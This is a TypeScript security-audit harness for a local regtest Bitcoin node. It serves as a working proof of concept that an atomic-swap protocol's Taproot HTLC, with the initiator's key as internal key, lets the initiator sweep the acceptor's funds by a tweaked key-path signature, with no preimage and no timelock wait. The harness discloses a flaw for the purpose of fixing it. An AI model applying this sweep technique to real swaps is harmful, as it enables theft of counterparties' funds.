// AUDIT HARNESS (temporary): proves the initiator can key-path spend an HTLC
// constructed exactly as the protocol mandates (internalPubKey = initiatorPubKey),
// without the preimage and before the refund timelock.
import * as bitcoin from 'bitcoinjs-lib';
import * as ecc from '@bitcoinerlab/secp256k1';
import { ECPairFactory } from 'ecpair';
import axios from 'axios';
import { PureBitcoinSwap } from './src/lib/PureBitcoinSwap';

bitcoin.initEccLib(ecc);
const ECPair = ECPairFactory(ecc);
const network = bitcoin.networks.regtest;

const rpc = async (method: string, params: any[] = [], wallet = 'miner') => {
    const res = await axios.post(`http://user:password@127.0.0.1:18443/wallet/${wallet}`, {
        jsonrpc: '1.0', id: 'audit', method, params
    });
    if (res.data.error) throw new Error(`${method}: ${JSON.stringify(res.data.error)}`);
    return res.data.result;
};

const taggedHash = (tag: string, msg: Buffer): Buffer =>
    Buffer.from((bitcoin.crypto.taggedHash as any)(tag, msg));

async function main() {
    // Protocol roles
    const initiator = PureBitcoinSwap.generateKeyPair();
    const acceptor = PureBitcoinSwap.generateKeyPair();

    // Offer parameters exactly as server.ts:898-901 enforces:
    // internal key = INITIATOR pubkey, for BOTH HTLCs.
    const preimage = Buffer.alloc(32, 0x42); // unknown to "acceptor" in this sim; initiator will NOT use it
    const hashLock = Buffer.from(bitcoin.crypto.sha256(preimage));
    const lockTime = 111 + 288; // far-future refund deadline

    // Acceptor-funded ("second") HTLC: recipient = initiator, refund = acceptor
    const htlc = PureBitcoinSwap.createTaprootHtlc(
        Buffer.from(initiator.publicKey), // <-- internalPubKey as enforced by the server
        hashLock,
        Buffer.from(initiator.publicKey), // recipient (claim leaf)
        Buffer.from(acceptor.publicKey),  // refund (refund leaf)
        lockTime,
        network
    );
    const htlcAddress = htlc.address!;
    console.log('HTLC address:', htlcAddress);

    // "Acceptor" funds the HTLC (we simulate with the miner wallet; the tx shape is irrelevant)
    const fundTxid = await rpc('sendtoaddress', [htlcAddress, 0.001]);
    const rawFund: string = await rpc('getrawtransaction', [fundTxid]);
    const fundTx = bitcoin.Transaction.fromHex(rawFund);
    const htlcScript = htlc.output!;
    const vout = fundTx.outs.findIndex(o => Buffer.from(o.script).equals(Buffer.from(htlcScript)));
    const value = fundTx.outs[vout].value;
    console.log(`Funded outpoint ${fundTxid}:${vout} value=${value} sats (unconfirmed)`);

    // === ATTACK: initiator key-path spends the HTLC. No preimage, no timelock wait. ===
    // Merkle root over the two tapleaves (both scripts fully determined by PUBLIC offer data).
    const claimScript = PureBitcoinSwap.createHtlcClaimScript(hashLock, Buffer.from(initiator.publicKey));
    const refundScript = PureBitcoinSwap.createHtlcRefundScript(Buffer.from(acceptor.publicKey), lockTime);
    const lh1 = PureBitcoinSwap.tapleafHash(claimScript);
    const lh2 = PureBitcoinSwap.tapleafHash(refundScript);
    const [a, b] = Buffer.compare(lh1, lh2) < 0 ? [lh1, lh2] : [lh2, lh1];
    const merkleRoot = Buffer.from(taggedHash('TapBranch', Buffer.concat([a, b])));

    const dest = await rpc('getnewaddress');
    const sweep = new bitcoin.Transaction();
    sweep.version = 2;
    sweep.addInput(Buffer.from(fundTxid, 'hex').reverse(), vout);
    sweep.addOutput(bitcoin.address.toOutputScript(dest, network), value - 1000n); // 1000 sats fee

    const sighash = sweep.hashForWitnessV1(0, [htlcScript], [value], bitcoin.Transaction.SIGHASH_DEFAULT);
    // Initiator tweaks THEIR OWN private key with the publicly-computable merkle root.
    const tweaked = PureBitcoinSwap.getTweakedKeyPair(initiator, merkleRoot, network);
    const sig = Buffer.from(tweaked.signSchnorr(sighash));
    sweep.setWitness(0, [sig]);

    const sweepHex = sweep.toHex();
    const acceptResult = await rpc('testmempoolaccept', [[sweepHex]], undefined as any).catch(async () => {
        // wallet-scoped endpoint also supports testmempoolaccept
        const res = await axios.post(`http://user:password@127.0.0.1:18443/`, {
            jsonrpc: '1.0', id: 'audit', method: 'testmempoolaccept', params: [[sweepHex]]
        });
        return res.data.result;
    });
    console.log('testmempoolaccept:', JSON.stringify(acceptResult));

    if (acceptResult?.[0]?.allowed) {
        console.log('\n*** CONFIRMED: initiator key-path sweep of the acceptor-funded HTLC is consensus-valid. ***');
        console.log('*** No preimage revealed, refund timelock not reached. Acceptor funds are stealable. ***');
    } else {
        console.log('Key-path spend REJECTED — suspicion not confirmed.');
        console.log('reject reason:', acceptResult?.[0]?.['reject-reason']);
    }
}

main().catch(e => { console.error('FAIL:', e.message); process.exit(1); });
